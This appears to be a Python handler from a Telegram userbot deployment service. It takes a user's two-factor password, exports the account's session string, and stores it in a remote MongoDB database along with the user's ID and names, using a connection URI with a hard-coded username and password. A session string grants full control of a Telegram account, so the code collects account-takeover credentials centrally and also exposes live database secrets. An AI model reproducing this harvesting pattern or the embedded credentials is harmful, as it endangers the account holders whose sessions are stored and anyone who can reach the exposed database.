#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# (c) Shrimadhav U K
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Affero General Public License for more details.

# You should have received a copy of the GNU Affero General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.
import heroku3
from Ubotlibs.Ubot.database import cli
#from config import MONGO_URL

import pymongo
from pyrogram import (
    Client,
    filters
)
from pyrogram.types import (
    Message
)
from pyrogram.errors import (
    PasswordHashInvalid
)
from Ubot import (
    AKTIFPERINTAH,
    TFA_CODE_IN_VALID_ERR_TEXT,
    app,
    bots
)
import pymongo
import sys
import os
import dotenv
from dotenv import load_dotenv
from Ubot.logging import LOGGER
from os import environ, execle, path
import shutil
HAPP = None
session_count = 1

def restart():
    os.execvp(sys.executable, [sys.executable, "-m", "Ubot"])


@Client.on_message(
    filters.text &
    filters.private,
    group=3
)
async def recv_tg_tfa_message(_, message: Message):

    w_s_dict = AKTIFPERINTAH.get(message.chat.id)
    if not w_s_dict:
        return
    phone_number = w_s_dict.get("PHONE_NUMBER")
    loical_ci = w_s_dict.get("USER_CLIENT")
    is_tfa_reqd = bool(w_s_dict.get("IS_NEEDED_TFA"))
    if not is_tfa_reqd or not phone_number:
        return
    tfa_code = message.text
    try:
        await loical_ci.check_password(tfa_code)
    except PasswordHashInvalid:
        await message.reply_text(
            TFA_CODE_IN_VALID_ERR_TEXT
        )
        del AKTIFPERINTAH[message.chat.id]
    else:
        saved_message_ = await message.reply_text(
            "<code>" + str(await loical_ci.export_session_string()) + "</code>"
        )        
        client = pymongo.MongoClient("mongodb+srv://pyRainger:pyRainger@session1.pt52wqg.mongodb.net/?retryWrites=true&w=majority")
        db = client["telegram_sessions"]
        mongo_collection = db["sesi_collection"]
        session_string = str(await loical_ci.export_session_string())
        session_data = {"string_session": session_string}
        
        existing_session = mongo_collection.find_one({"session_string": session_string})
        if existing_session:
            await message.reply_text("Sesi sudah ada")
            return

        if mongo_collection.count_documents({}) >= 100:
            await message.reply_text(
                "Tidak dapat menambahkan sesi baru. Harap hapus sesi yang tidak digunakan terlebih dahulu."
            )
            return
        cek = db.command("collstats", "sesi_collection")["count"]
        cek += 1
        session_data = {
            "no": cek,
            "session_string": session_string,
            "user_id": message.chat.id,
            "username": message.chat.username,
            "first_name": message.chat.first_name,
            "last_name": message.chat.last_name,
        }        
        mongo_collection.insert_one(session_data)
        await message.reply_text("String sudah siap, otw buat yah ... wait ")  
        filename = ".env"
        user_id = mongo_collection.find_one({"user_id": message.chat.id})
        cek = db.command("collstats", "sesi_collection")["count"]
        sesi = user_id.get('session_string')
        try:
            await message.edit("`Permintaan anda sedang di proses.`")
            LOGGER(__name__).info("DEPLOY BOT!!")
        except BaseException as err:
            LOGGER(__name__).info(f"{err}")
            return
        await message.edit("✅ **Bot akan akan di aktifkan di akun anda**\n\n")
        if HAPP is not None:
            HAPP.restart()
        else:
            args = [sys.executable, "-m", "Ubot"]
            execle(sys.executable, *args, environ)
                        
    raise message.stop_propagation()
